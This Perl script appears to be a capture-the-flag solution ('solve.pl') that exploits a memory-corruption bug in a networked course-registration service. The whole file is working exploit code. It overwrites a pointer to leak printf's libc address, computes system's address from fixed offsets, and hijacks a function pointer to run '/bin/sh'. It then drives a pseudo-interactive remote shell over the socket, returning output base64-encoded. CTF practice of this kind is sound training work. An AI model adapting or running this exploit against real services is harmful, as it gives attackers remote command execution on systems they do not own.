#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket;
use MIME::Base64;

if (@ARGV != 2) {
	warn "Usage: ./solve.pl host port\n";
	exit 1;
}

my $libc_printf = 0x60770;
my $libc_system = 0x50d60;

my $sock = new IO::Socket::INET(PeerAddr=>$ARGV[0], PeerPort=>int($ARGV[1]), Proto=>"tcp");
die "connect failed: $!\n" unless $sock;

print $sock "/bin/sh\0\0"; # name
print $sock "1\n"; # id
print $sock "1\n"; # major

print $sock "1\n"; # Register Mandatory Class
print $sock "4\n"; # The World of Intellect

print $sock "4\n"; # Write Memo
print $sock "FRI 3\0"; # choose the class
print $sock "\x38\x50\x40\0\0\0\0\0"; # professor = address of printf
sleep 1; # have it send

print $sock "2\n"; # Register Elective Class
# get the address of printf
my $printf_addr = 0;
my $key = "Intellect - ";
for (;;) {
	my $line = <$sock>;
	die "communication error: $!\n" unless $line;
	chomp($line);
	my $idx = index($line, $key);
	if ($idx >= 0) {
		my $printf_addr_data = substr($line, $idx + length($key));
		$printf_addr_data .= "\0" x (8 - length($printf_addr_data));
		$printf_addr = (unpack("Q", $printf_addr_data))[0];
		last;
	}
}
print $sock "1\n"; # The World of Intellect

printf "printf = 0x%x\n", $printf_addr;

print $sock "4\n"; # Write Memo
print $sock "FRI 3\0"; # choose the class
# professor = address of printf, IsAvailable = system
print $sock pack("QQ", 0x405038, $printf_addr + $libc_system - $libc_printf);
sleep 1; # have it send

print $sock "2\n"; # Register Elective Class
print $sock "1\n"; # The World of Intellect

# system("/bin/sh"); should be executed!
my $check = "meowmeowmeowmeowmeow";
print $sock "echo $check\n";
for (;;) {
	my $line = <$sock>;
	die "communication error: $!\n" unless $line;
	if (index($line, $check) >= 0) {
		last;
	}
}

print "entering pseudo-interactive shell!\n";
for (;;) {
	my $command = <STDIN>;
	chomp($command);
	if ($command eq "exit") { last; }
	if ($command eq "") { next; }
	print $sock "$command | base64 -w 99999999\n";
	my $res = <$sock>;
	die "communication error: $!\n" unless $res;
	print decode_base64($res);
}

close $sock;
